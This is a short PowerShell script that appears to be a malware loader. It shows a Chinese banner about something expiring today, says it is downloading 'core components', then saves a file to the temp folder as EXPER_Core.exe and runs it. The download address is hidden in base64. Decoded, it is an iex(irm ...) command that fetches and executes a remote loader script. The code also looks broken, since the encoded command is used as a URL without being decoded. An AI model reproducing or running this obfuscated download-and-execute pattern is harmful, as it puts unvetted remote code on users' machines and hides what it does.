# 
Write-Host "遐想 今 天 下 午  1 点 过 期" -ForegroundColor Cyan

# 
$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8ARQBYAFAARQBSAC0ATABvAGEAZABlAHIALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGwAbwBhAGQAZQByAC4AcABzADEAJwApAA=="
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -ForegroundColor Gray
Invoke-WebRequest -Uri $Url -OutFile $Path

# 
Start-Process $Path
